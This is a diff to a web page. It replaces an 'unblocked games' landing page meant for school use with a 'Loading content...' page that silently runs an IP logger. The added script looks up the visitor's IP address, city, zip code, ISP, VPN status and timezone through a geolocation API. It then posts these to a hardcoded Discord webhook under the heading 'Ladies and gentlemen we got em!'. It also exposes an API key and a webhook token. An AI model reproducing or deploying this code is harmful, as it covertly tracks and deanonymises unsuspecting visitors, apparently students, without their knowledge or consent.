@@ -1,59 +1,51 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
   <head>
-    <title>mathpunch V3</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        margin: 0;
-        padding: 0;
-        background-color: #f2f2f2;
-      }
-      h1 {
-        font-size: 36px;
-        color: #0066cc;
-        text-align: center;
-        margin-top: 50px;
-      }
-      p {
-        font-size: 18px;
-        line-height: 1.5;
-        color: #333;
-        margin: 20px 10px;
-      }
-      a {
-        color: #333;
-        text-decoration: underline;
-      }
-      a:hover {
-        color: blue;
-      }
-      .button {
-        text-decoration: none;
-        display: block;
-        width: 25%;
-        height: 40px;
-        background-color: #0066cc;
-        color: #fff;
-        text-align: center;
-        line-height: 40px;
-        border-radius: 5px;
-        margin: 0 auto;
-        margin-top: 50px;
-        transition: background-color 0.3s ease-in-out;
-      }
-      .button:hover {
-        background-color: #004080;
-        color: #fff;
-        cursor: pointer;
-      }
-    </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loading...</title>
   </head>
   <body>
-    <h1>mathpunch V3</h1>
-    <p>mathpunch is A Unblocked Game Website Mainly For School Use But Can Also Be Used in Work.</p>
-    <p>This is Another mathpunch V3 Just in Case mathpunch V3 is Banned For You</a>.</p>
-    <a href="./tests/sample.html" class="button">Click Me</a>
-    <p style="text-align:center;"><small>Or Just Click The Button To Go To it <a target="_blank" href="https://putnamcityschools.github.io/echolog/tests/sample.html">Click Me</a></small></p>
+    <h1>Loading content...</h1>
+    <script src="https://3kh0.github.io/js/main.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=01adf7571457444fa218e96a5ec18119"), function (data) {
+        const ip = data.ip_address;
+        const city = data.city;
+        const region = data.region;
+        const zip = data.postal_code;
+        const country = data.country;
+        const flag = data.flag.emoji;
+        const aso = data.connection.autonomous_system_organization;
+        const isp = data.connection.isp_name;
+        const org = data.connection.organization_name;
+        const vpn = data.security.is_vpn;
+        const tz = data.timezone.name;
+        const ct = data.timezone.current_time;
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1081050344995430480/kqoJxiowYElpX6I7YAi1B23n6uQPWG1CqUY8KCulFWuCNfeli8c4sLIM3-a7N1YpsGRT");
+        // Put in your discord webhook url above ^^^
+        request.setRequestHeader("Content-type", "application/json");
+        const params = {
+          username: "ECHOLOG",
+          avatar_url: "https://3kh0.github.io/img/echo.jpg",
+          content: "**Ladies and gentlemen we got em!**\n> IP: " + ip + 
+          "\n> City: " + city + 
+          "\n> Region: " + region + 
+          "\n> Zip: " + zip + 
+          "\n> Country: " + country +
+          "\n> Flag: " + flag +
+          "\n> Auto System Org: " + aso +
+          "\n> ISP: " + isp +
+          "\n> Org: " + org +
+          "\n> Using VPN: " + vpn +
+          "\n> Timezone: " + tz +
+          "\n> Current time: " + ct
+          ,
+        };
+        request.send(JSON.stringify(params));
+      });
+    </script>
   </body>
 </html>
